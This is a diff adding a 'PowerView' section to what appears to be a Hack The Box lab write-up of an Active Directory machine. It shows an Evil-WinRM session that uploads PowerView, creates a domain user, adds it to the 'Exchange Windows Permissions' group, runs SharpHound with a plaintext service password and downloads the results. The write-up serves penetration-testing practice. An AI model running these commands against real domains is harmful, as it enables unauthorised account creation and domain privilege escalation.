@@ -257,6 +257,85 @@ Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[Mem
 [-] Invalid path, skipping
 Please choose a path [0-1] 
 ```
+##  PowerView
+```markdown
+Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/PowerSploit/Recon/PowerView.ps1
+Info: Uploading /root/tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1                                                                                                
 
+Data: 1027040 bytes of 1027040 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $UserPassword = ConvertTo-SecureString 'zerocode' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> New-DomainUser -SamAccountName zer0code -Description 'my test' -AccountPassword $UserPassword
+
+
+GivenName                         : 
+MiddleName                        : 
+Surname                           : 
+EmailAddress                      : 
+VoiceTelephoneNumber              : 
+EmployeeId                        : 
+AdvancedSearchFilter              : System.DirectoryServices.AccountManagement.AdvancedFilters
+Enabled                           : True
+AccountLockoutTime                : 
+LastLogon                         : 
+PermittedWorkstations             : {}
+PermittedLogonTimes               : 
+AccountExpirationDate             : 
+SmartcardLogonRequired            : False
+DelegationPermitted               : True
+BadLogonCount                     : 0
+HomeDirectory                     : 
+HomeDrive                         : 
+ScriptPath                        : 
+LastPasswordSet                   : 1/23/2020 11:20:01 AM
+LastBadPasswordAttempt            : 
+PasswordNotRequired               : False
+PasswordNeverExpires              : False
+UserCannotChangePassword          : False
+AllowReversiblePasswordEncryption : False
+Certificates                      : {}
+Context                           : System.DirectoryServices.AccountManagement.PrincipalContext
+ContextType                       : Domain
+Description                       : my test
+DisplayName                       : zer0code
+SamAccountName                    : zer0code
+UserPrincipalName                 : 
+Sid                               : S-1-5-21-3072663084-364016917-1341370565-7601
+Guid                              : 8ff5b1ee-f8b1-4370-a221-5897f07c5915
+DistinguishedName                 : CN=zer0code,CN=Users,DC=htb,DC=local
+StructuralObjectClass             : user
+Name                              : zer0code
+
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members zer0code
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -Domain HTB -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -DomainController Forest.htb.local
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
+
+
+    Directory: C:\Users\svc-alfresco\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a----        1/23/2020   3:21 AM          12933 20200123032135_BloodHound.zip                                                                                                                                                                           
+-a----        1/23/2020   3:19 AM         770280 PowerView.ps1                                                                                                                                                                                           
+-a----        1/23/2020   3:21 AM           9038 Rk9SRVNU.bin                                                                                                                                                                                            
+-a----        1/23/2020   2:35 AM         779776 SharpHound.exe                                                                                                                                                                                          
+-a----        1/23/2020   1:53 AM         919546 SharpHound.ps1                                                                                                                                                                                          
+
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200123032135_BloodHound.zip
+Info: Downloading C:\Users\svc-alfresco\Documents\20200123032135_BloodHound.zip to 20200123032135_BloodHound.zip                                                                                            
+
+Info: Download successful!
+
+```
+#### Shortest Path from Zer0Code to Domain Admins: 
+![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound2.png "BloodHound")
 ## Resources:
 [https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)
